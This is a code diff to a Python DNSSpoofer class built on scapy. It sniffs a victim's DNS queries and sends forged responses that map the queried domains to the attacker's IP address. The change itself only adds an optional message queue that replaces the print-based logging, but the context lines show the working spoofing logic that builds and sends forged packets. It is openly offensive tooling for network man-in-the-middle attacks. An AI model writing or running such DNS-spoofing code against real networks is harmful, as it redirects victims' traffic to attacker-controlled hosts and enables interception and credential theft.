@@ -1,17 +1,26 @@
 from scapy.all import ARP, Ether, send, sniff, srp
 from scapy.layers.dns import DNS,DNSQR,DNSRR,UDP,IP,TCP
 class DNSSpoofer:
-    def __init__(self,attacker_ip:str,victim_ip:str,domain=None) -> None:
+    def __init__(self,attacker_ip:str,victim_ip:str,domain=None,queue=None) -> None:
         self.attacker_ip = attacker_ip
         self.victim_ip = victim_ip
 
         self.domain = domain
 
+        if queue :
+            self.queue = queue
+        else :
+            self.queue = None
+    
+    def writeInQueue(self,message):
+        if self.queue :
+            self.queue.put(message)
+
     def spit(self,pkt):
         """Spoof DNS responses for DNS queries."""
         if pkt.haslayer(DNS) and pkt[IP].src == self.victim_ip :
             qname = pkt[DNSQR].qname.decode()
-            print("DNS PACKET",qname)
+            # print("DNS PACKET",qname)
 
             # Check for the domain you want to spoof
             #if b"example.com" in qname:  
@@ -30,7 +39,7 @@ class DNSSpoofer:
                     )
                     # Send the spoofed DNS response to the victim
                     send(dns_response, verbose=False)
-                    print(f"[+] Sent spoofed DNS response with IP {self.attacker_ip} for {qname}")
+                    self.writeInQueue(f"[+] Sent spoofed DNS response with IP {self.attacker_ip} for {qname}")
             else :
                 dns_response = (
                         IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
